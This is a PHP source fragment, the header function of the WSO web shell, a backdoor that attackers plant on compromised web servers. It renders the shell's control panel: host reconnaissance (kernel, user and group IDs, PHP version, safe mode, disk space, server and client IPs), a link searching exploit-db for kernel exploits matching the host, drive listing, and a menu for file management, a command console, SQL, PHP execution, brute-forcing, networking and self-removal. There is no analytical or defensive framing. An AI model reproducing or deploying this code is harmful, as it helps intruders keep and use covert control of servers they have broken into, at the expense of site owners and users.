<?php
function wsoHeader() {
	if(empty($_POST['charset']))
		$_POST['charset'] = $GLOBALS['default_charset'];
	global $color,$font1, $font2;
	echo "<html><head><meta http-equiv='Content-Type' content='text/html; charset=" . $_POST['charset'] . "'><title>" . $_SERVER['HTTP_HOST'] . $shell_title ."</title>
<style>
body{background-color:#444;color:#e1e1e1;font: $font1}
body,td,th{ font: $font1;margin:0;vertical-align:top;color:#e1e1e1; }
table.info{ color:#fff;background-color:#222; }
span,h1,a{ color: $color !important; font: $font1}
span{ font-weight: bolder; }
h1{ border-left:5px solid $color;padding: 2px 5px;font: $font2;background-color:#222;margin:0px; }
div.content{ padding: 5px;margin-left:5px;background-color:#333; }
a{ text-decoration:none; }
a:hover{ text-decoration:underline; }
.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }
.bigarea{ width:100%;height:300px; }
input,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid $color; font: 9pt Monospace,'Courier New'; }
form{ margin:0px; }
#toolsTbl{ text-align:center; }
.toolsInp{ width: 300px }
.main th{text-align:left;background-color:#5e5e5e;}
.main tr:hover{background-color:#5e5e5e}
.l1{background-color:#444}
.l2{background-color:#333}
pre{font-family:Courier,Monospace;}
</style>
<script>
    var c_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';
    var a_ = '" . htmlspecialchars(@$_POST['a']) ."'
    var charset_ = '" . htmlspecialchars(@$_POST['charset']) ."';
    var p1_ = '" . ((strpos(@$_POST['p1'],"\n")!==false)?'':htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';
    var p2_ = '" . ((strpos(@$_POST['p2'],"\n")!==false)?'':htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';
    var p3_ = '" . ((strpos(@$_POST['p3'],"\n")!==false)?'':htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';
    var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = 'ajax=true';
		for(i=0;i<d.mf.elements.length;i++)
			params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);
		sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject('Microsoft.XMLHTTP');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open('POST', url, true);
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert('Request error!');
	}
</script>
<head><body><div style='position:absolute;width:100%;background-color:#444;top:0;left:0;'>
<form method=post name=mf style='display:none;'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>";
	$freeSpace = @diskfreespace($GLOBALS['cwd']);
	$totalSpace = @disk_total_space($GLOBALS['cwd']);
	$totalSpace = $totalSpace?$totalSpace:1;
	$release = @php_uname('r');
	$kernel = @php_uname('s');
	$explink = 'http://exploit-db.com/search/?action=search&filter_description=';
	if(strpos('Linux', $kernel) !== false)
		$explink .= urlencode('Linux Kernel ' . substr($release,0,6));
	else
		$explink .= urlencode($kernel . ' ' . substr($release,0,3));
	if(!function_exists('posix_getegid')) {
		$user = @get_current_user();
		$uid = @getmyuid();
		$gid = @getmygid();
		$group = "?";
	} else {
		$uid = @posix_getpwuid(posix_geteuid());
		$gid = @posix_getgrgid(posix_getegid());
		$user = $uid['name'];
		$uid = $uid['uid'];
		$group = $gid['name'];
		$gid = $gid['gid'];
	}

	$cwd_links = '';
	$path = explode("/", $GLOBALS['cwd']);
	$n=count($path);
	for($i=0; $i<$n-1; $i++) {
		$cwd_links .= "<a href='#' onclick='g(\"FilesMan\",\"";
		for($j=0; $j<=$i; $j++)
			$cwd_links .= $path[$j].'/';
		$cwd_links .= "\")'>".$path[$i]."/</a>";
	}

	$charsets = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866');
	$opt_charsets = '';
	foreach($charsets as $item)
		$opt_charsets .= '<option value="'.$item.'" '.($_POST['charset']==$item?'selected':'').'>'.$item.'</option>';

	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Sql'=>'Sql','Php'=>'Php','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');
	if(!empty($GLOBALS['auth_pass']))
		$m['Logout'] = 'Logout';
	$m['Self remove'] = 'SelfRemove';
	$menu = '';
	foreach($m as $k => $v)
		$menu .= '<th width="'.(int)(100/count($m)).'%">[ <a href="#" onclick="g(\''.$v.'\',null,\'\',\'\',\'\')">'.$k.'</a> ]</th>';

	$drives = "";
	if($GLOBALS['os'] == 'win') {
		foreach(range('c','z') as $drive)
		if(is_dir($drive.':\\'))
			$drives .= '<a href="#" onclick="g(\'FilesMan\',\''.$drive.':/\')">[ '.$drive.' ]</a> ';
	}
	echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($GLOBALS['os'] == 'win'?'<br>Drives:':'') . '</span></td>'
       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="' . $explink . '" target=_blank>[exploit-db.com]</a></nobr><br>' . $uid . ' ( ' . $user . ' ) <span>Group:</span> ' . $gid . ' ( ' . $group . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($GLOBALS['safe_mode']?'<font color=red>ON</font>':'<font color=green><b>OFF</b></font>')
       . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . wsoViewSize($totalSpace) . ' <span>Free:</span> ' . wsoViewSize($freeSpace) . ' ('. (int) ($freeSpace/$totalSpace*100) . '%)<br>' . $cwd_links . ' '. wsoPermsColor($GLOBALS['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $GLOBALS['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $drives . '</td>'
       . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $opt_charsets . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER["SERVER_ADDR"] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>'
       . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $menu . '</tr></table><div style="margin:5">';
}
